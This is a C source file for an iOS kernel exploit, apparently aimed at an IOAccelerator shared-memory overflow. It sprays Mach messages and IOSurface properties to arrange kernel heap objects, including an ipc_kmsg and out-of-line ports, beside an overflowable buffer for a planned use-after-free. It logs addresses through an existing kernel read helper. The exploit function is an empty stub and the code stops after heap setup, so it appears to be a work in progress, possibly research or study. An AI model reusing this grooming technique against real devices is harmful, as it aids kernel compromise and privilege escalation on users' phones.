#include <stdio.h>

#include "print.h"
#include "ioaccel.h"
#include "iosurface.h"
#include "exploit_utilities.h"
#include "exploit.h"

#define ENABLE_HELPER 1

#if ENABLE_HELPER
#include "helper/krw.h"
#include "helper/offsets.h"
#include "helper/kexecute.h"
#include "helper/find_port.h"
#include "helper/find_shmem.h"
#include "helper/find_IOSurface.h"
#include "helper/translations.h"

extern uint64_t kbase;
extern uint64_t kslide;
#endif

extern mach_port_t tfp0;

// Kernel Page Size.
extern mach_vm_size_t pagesize;

int exploit(void) {

	return 0;
}

#if ENABLE_HELPER
// OSArray stuffs
// OSObject_1 *__fastcall OSArray::getObject(const OSArray_1 *this, unsigned int index)
uint64_t OSArray_objectAtIndex(uint64_t array, int idx) {
    uint64_t array_buffer = kread64(array + off_osarray_array); // 0x20 = p/x offsetof(OSArray, array)
    return kread64(array_buffer + idx * sizeof(uint64_t));
}

uint64_t OSData_buffer(uint64_t osdata) {
    return kread64(osdata + off_osdata_data);	// 0x18 = p/x offsetof(OSData, data)
}

uint64_t OSDictionary_objectAtIndex(uint64_t osdict, int idx) {
    uint64_t dict_buffer = kread64(osdict + off_osdictionary_dictionary); // 0x20 = p/x offsetof(OSDictionary, dictionary)
    return kread64(dict_buffer + idx * sizeof(uint64_t));
}
#endif

int main(int argc, char *argv[], char *envp[]) {
    int ret = 0;

	IOAccelerator_init();
	IOSurface_init();

#if ENABLE_HELPER
    offsets_init();
	init_tfp0(); 
	INFO("tfp0: 0x%" PRIx32 "\n", tfp0);

	int r = get_kbase(&kbase);
    INFO("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);
    init_kexecute();
#endif

    void *data = NULL;
	mach_port_t ports[port_cnt] = {};

	// setup 200 ports for later use
    for (int i = 0; i < port_cnt; i++) {
        ports[i] = new_mach_port();
		// INFO("got new_mach_port[%d]: 0x%x\n", i, ports[i]);
    }

	int port_i = 0;
#define POP_PORT() ports[port_i++]

// ----------- heap pre-exploit setup ----------- //
    INFO("Doing stage 0 heap setup\n");

	// fill kalloc_map so new allocations are always done in kernel_map (where our buffer that will get overflowed is)
    mach_port_t saved_ports[10];
    mach_msg_size_t msg_size = message_size_for_kalloc_size(7 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    size_t stage0_sz = pagesize == 0x4000 ? 10 MB : 5 MB;
    for (int i = 0; i < 10; i++) {
        saved_ports[i] = POP_PORT();

        #if ENABLE_HELPER
        //helper; set signature
        if((i % 2) == 0) {memset(data, 0x74, msg_size);}
        else {memset(data, 0x72, msg_size);}
        #endif

        for (int j = 0; j < stage0_sz / (7 * pagesize); j++) {
            
            kern_return_t ret = send_message(saved_ports[i], data, msg_size);
            
            if (ret) {
                ERROR("Failed to send message\n");
                goto err;
            }
        }

        #if ENABLE_HELPER
        //helper; obtain msgdata_kptr
        uint64_t kmsgdata_kptr = find_kmsgdata_from_port(saved_ports[i]);
        INFO("saved_ports[%d](port=0x%x)'s msgdata_kptr = 0x%llx\n", i, saved_ports[i], kmsgdata_kptr);
        #endif
    }
    
    
    free(data);
    data = NULL;

    // we'll never do allocations smaller than 8 pages, so create some 7 page holes so the system can do small allocations there and leave us in peace
    mach_port_destroy(mach_task_self(), saved_ports[0]);
    mach_port_destroy(mach_task_self(), saved_ports[2]);
    mach_port_destroy(mach_task_self(), saved_ports[4]);
    mach_port_destroy(mach_task_self(), saved_ports[5]);
    mach_port_destroy(mach_task_self(), saved_ports[7]);
    mach_port_destroy(mach_task_self(), saved_ports[9]);

    // make a bunch of 8 page allocations to ensure there are no holes that mess with our allocations
    mach_port_t spray = POP_PORT();
    msg_size = message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    
    #if ENABLE_HELPER
    //helper; set signature
    memset(data, 0x81, msg_size);
    #endif

    for (int i = 0; i < MACH_PORT_QLIMIT_LARGE; i++) {  //MACH_PORT_QLIMIT_LARGE = (1024)
        kern_return_t ret = send_message(spray, data, msg_size);
        if (ret) {
            printf("[-] Failed to send message\n");
            goto err;
        }
    }

    #if ENABLE_HELPER
    //helper; obtain msgdata_kptr 
    uint64_t kmsgdata_kptr = find_kmsgdata_from_port(spray);
    INFO("spray(port=0x%x)'s msgdata_kptr = 0x%llx\n", spray, kmsgdata_kptr);
    // getchar();
    //
    #endif

    // ----------- heap stage 1 setup -----------//
    
    INFO("Doing stage 1 heap setup\n");
    
    int property_index = 0;
    uint32_t huge_kalloc_key = transpose(property_index++);
    ret = IOSurface_empty_kalloc(82 MB, huge_kalloc_key);
    if (ret) {
        ERROR("Failed to allocate empty kalloc buffer (ret: 0x%x, %s)\n", ret, mach_error_string(ret));
        goto err;
    }

    #if ENABLE_HELPER
    //helper; find our sprayed IOSurface data
    uint64_t userspaceValueDicts = userdict_from_IOSurface();
	INFO("IOSurface's userspaceValueDicts: 0x%llx\n", userspaceValueDicts);
    struct kOSDict *dict = kernel_fetch_dict(userspaceValueDicts);
    uint64_t osdict_entry = 0;
    
    for (int i = 0; i < dict->count; i++) {
		if(dict->items[i].value) {
            uint32_t osdict_count = kread32(dict->items[i].value + off_osdictionary_count);
	        uint32_t osdict_capacity = kread32(dict->items[i].value + off_osdictionary_capacity);
            osdict_entry = kread64(dict->items[i].value + off_osdictionary_dictionary);

            if(osdict_capacity == (82 MB / 0x10)) {
                uint64_t osdictentry_key = kread64(osdict_entry + off_osdictentry_dict);  
                uint64_t osdict_kbuffer = kread64(osdictentry_key + off_osstring_string);
                
                if(kread32(osdict_kbuffer) == 0xaabbcc) {
                    SUCCESS("Found our 1st sprayed IOSurface data!\n");
                    INFO("OSDict from userspaceValueDicts[%u] = 0x%llx\n", i, dict->items[i].value);
                    INFO("osdict_count = 0x%x, osdict_capacity = 0x%x, osdict_entry = 0x%llx\n", osdict_count, osdict_capacity, osdict_entry);
                    INFO("osdictentry_key = 0x%llx\n", osdictentry_key);
                    INFO("osdict_kbuffer = 0x%llx -> 0x%x\n", osdict_kbuffer, kread32(osdict_kbuffer));
                    break;
                }
            }
		}
    }
    // getchar();
    //
    #endif

    
    // setup the buffers that we'll overflow
    struct IOAccelDeviceShmemData cmdbuf, seglist;
    uint64_t command_buffer_shmem_sig = 0x4142434445464748;
	uint64_t segment_list_shmem_sig = 0x5152535455565758;
    ret = alloc_shmem_with_sig(96 MB, &cmdbuf, &seglist, command_buffer_shmem_sig, segment_list_shmem_sig);

    if (ret) {
        ERROR("Failed to allocate shared memory\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; find our 96MB shmem data
    translation_init();
    uint64_t command_buffer_shmem_data_kva, segment_list_shmem_data_kva = 0;
	find_shmem_in_kernel_4(&command_buffer_shmem_data_kva, &segment_list_shmem_data_kva, command_buffer_shmem_sig, segment_list_shmem_sig, osdict_entry);
	SUCCESS("command_buffer_shmem_data_kva: 0x%llx\n", command_buffer_shmem_data_kva);
	SUCCESS("segment_list_shmem_data_kva: 0x%llx\n", segment_list_shmem_data_kva);
    //
    #endif

    // heap now:
    // ------------------+------------------+------------------+----------------
    //     huge kalloc   |   segment list   |  command buffer  |
    // ------------------+------------------+------------------+----------------
    //

    // port which we will later corrupt. should be exactly after command buffer
    mach_port_t corrupted_kmsg_port = POP_PORT();
    ret = send_message(corrupted_kmsg_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        printf("[-] Failed to send message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain struct ipc_kmsg's addr
    uint64_t ikmq_base = kread64(find_port(corrupted_kmsg_port) + off_ipc_port_ikmq_base);
    uint64_t ipc_kmsg_addr = ikmq_base;
    INFO("struct ipc_kmsg(port=0x%x) = 0x%llx\n", corrupted_kmsg_port, ipc_kmsg_addr);
    // getchar();
    //
    #endif

    // now:
    // ------------------+------------------+------------------+-----------------+-----------
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg |
    // ------------------+------------------+------------------+-----------------+-----------
    //



    // this is a placeholder, we need it allocated for now but later it'll be freed and allocated with controlled data which will be UAFd
    mach_port_t placeholder_message_port = POP_PORT();
    ret = send_message(placeholder_message_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        printf("[-] Failed to send message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain struct ipc_kmsg 2's addr
    ikmq_base = kread64(find_port(placeholder_message_port) + off_ipc_port_ikmq_base);
    uint64_t ipc_kmsg2_addr = ikmq_base;
    INFO("struct ipc_kmsg 2(port=0x%x) = 0x%llx\n", placeholder_message_port, ipc_kmsg2_addr);
    // getchar();
    //
    #endif
    
    // allocate ool buffer which we'll also UAF
    mach_port_t ool_message_port = POP_PORT();
    int ool_ports_count = (7 * pagesize) / sizeof(uint64_t) + 1;
    ret = send_ool_ports(ool_message_port, MACH_PORT_NULL, ool_ports_count, MACH_MSG_TYPE_COPY_SEND);
    if (ret) {
        printf("[-] Failed to send ool ports message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain ool ports addr
    uint64_t oolports_kptr = find_oolports_from_port(ool_message_port);
    INFO("ool_message_port(port=0x%x)'s msgdata_kptr = 0x%llx\n", ool_message_port, oolports_kptr);
    // khexdump(kread64(kmsgdata_kptr+4), 0x1000);
    // getchar();
    //
    #endif
    
    // now:
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //

    // free huge allocation
    ret = IOSurface_remove_property(huge_kalloc_key);
    if (ret) {
        printf("[-] Failed to remove IOSurface property\n");
        goto err;
    }

    void *spray_buffer = ((uint8_t *) cmdbuf.data) + pagesize;

    uint32_t kfree_buffer_key = transpose(property_index++);
    memset(spray_buffer, 0x42, 8 * pagesize); // we'll need later in clean up to check if memory is still allocated
    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 80 MB / (8 * pagesize), kfree_buffer_key);
    if (ret) {
        printf("[-] Failed to spray\n");
        goto err;
    }

    mach_port_destroy(mach_task_self(), placeholder_message_port);

    #if ENABLE_HELPER
    dict = kernel_fetch_dict(userspaceValueDicts);
    uint64_t kfree_buffer_addr = 0;
    
    for (int i = 0; i < dict->count; i++) {
		if(dict->items[i].value) {
            uint32_t osarray_count = kread32(dict->items[i].value + off_osarray_count);
	        uint32_t osarray_capacity = kread32(dict->items[i].value + off_osarray_capacity);
            uint64_t osarray_array = kread64(dict->items[i].value + off_osarray_array);

            if(osarray_count == (80 MB / (8 * pagesize))) {
                SUCCESS("Found our 2nd sprayed IOSurface data!\n");
                // INFO("osarray_count = 0x%x, osarray_capacity = 0x%x\n", osarray_capacity, osarray_capacity);

                for(uint32_t j = 0; j < osarray_count; j++) {
                    uint64_t osdata_in_osarray = OSArray_objectAtIndex(dict->items[i].value, j);
		            uint64_t kbuffer = OSData_buffer(osdata_in_osarray);
                    // printf("osdata_in_osarray = 0x%llx\n", osdata_in_osarray);
                    // printf("osdata_kbuffer(OSArray[%u]) = 0x%llx\n", j, kbuffer);
                    if(oolports_kptr < kbuffer) {
                        kfree_buffer_addr = kbuffer;
                        break;
                    }
                }
            }
		}
    }

    printf("\n\n=================== Overall Info ===================\n");
    printf("seglist =                   0x%llx\n", segment_list_shmem_data_kva);
    printf("cmdbuf =                    0x%llx\n", command_buffer_shmem_data_kva);
    printf("ipc_kmsg =                  0x%llx\n", ipc_kmsg_addr);
    printf("ipc_kmsg2(FREED) =          0x%llx\n", ipc_kmsg2_addr);
    printf("oolports =                  0x%llx\n", oolports_kptr);
    printf("kfree_buffer =              0x%llx\n", kfree_buffer_addr);
    printf("====================================================\n\n");
    #endif

    
    // now:
    // +------------------+------------------+-----------------+--------+-----------+--------------+
    // |   segment list   |  command buffer  | struct ipc_kmsg |  free  | ool ports | kfree_buffer |
    // +------------------+------------------+-----------------+--------+-----------+--------------+
    //

    uint32_t spray_buffer_key = transpose(property_index++);
    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 80 MB / (8 * pagesize), spray_buffer_key);
    if (ret) {
        printf("[-] Failed to spray\n");
        goto err;
    }

    #if ENABLE_HELPER
    dict = kernel_fetch_dict(userspaceValueDicts);
    uint64_t spray_buffer_addr = 0;
    
    for (int i = 0; i < dict->count; i++) {
		if(dict->items[i].value) {
            uint32_t osarray_count = kread32(dict->items[i].value + off_osarray_count);
	        uint32_t osarray_capacity = kread32(dict->items[i].value + off_osarray_capacity);
            uint64_t osarray_array = kread64(dict->items[i].value + off_osarray_array);

            if(osarray_count == (80 MB / (8 * pagesize)) && i == 2) {
                SUCCESS("Found our 3rd sprayed IOSurface data!\n");
                INFO("osarray_count = 0x%x, osarray_capacity = 0x%x\n", osarray_capacity, osarray_capacity);

                for(uint32_t j = 0; j < osarray_count; j++) {
                    uint64_t osdata_in_osarray = OSArray_objectAtIndex(dict->items[i].value, j);
		            uint64_t kbuffer = OSData_buffer(osdata_in_osarray);
                    // printf("osdata_in_osarray = 0x%llx\n", osdata_in_osarray);
                    // printf("osdata_kbuffer(OSArray[%u]) = 0x%llx\n", j, kbuffer);
                    if(ipc_kmsg_addr < kbuffer && kbuffer < oolports_kptr) {
                        spray_buffer_addr = kbuffer;
                        break;
                    }
                }
                // spray_buffer_addr = kbuffer;
            }
		}
    }

    printf("\n\n=================== Overall Info ===================\n");
    printf("seglist =                   0x%llx\n", segment_list_shmem_data_kva);
    printf("cmdbuf =                    0x%llx\n", command_buffer_shmem_data_kva);
    printf("ipc_kmsg =                  0x%llx\n", ipc_kmsg_addr);
    printf("ipc_kmsg2(FREED) =          0x%llx\n", ipc_kmsg2_addr);
    printf("[*] spray_buffer =          0x%llx\n", spray_buffer_addr);
    printf("oolports =                  0x%llx\n", oolports_kptr);
    printf("kfree_buffer =              0x%llx\n", kfree_buffer_addr);
    printf("====================================================\n\n");

    INFO("spinning here...\n"); 
    getchar();
    #endif
    
    // now:
    // +------------------+------------------+-----------------+--------------+-----------+--------------+
    // |   segment list   |  command buffer  | struct ipc_kmsg | spray_buffer | ool_ports | kfree_buffer |
    // +------------------+------------------+-----------------+--------------+-----------+--------------+
    //




err:
	// clean 200 ports
	for (int i = 0; i < port_cnt; i++) {
        if (ports[i] /*&& ports[i] != new_tfp0*/) mach_port_destroy(mach_task_self(), ports[i]);
    }

    if (data) free(data);
	
    #if ENABLE_HELPER
    term_kexecute();    //helper
    mach_port_destroy(mach_task_self(), tfp0);
    #endif

	IOAccelerator_deinit();
	IOSurface_deinit();
	return 0;
}
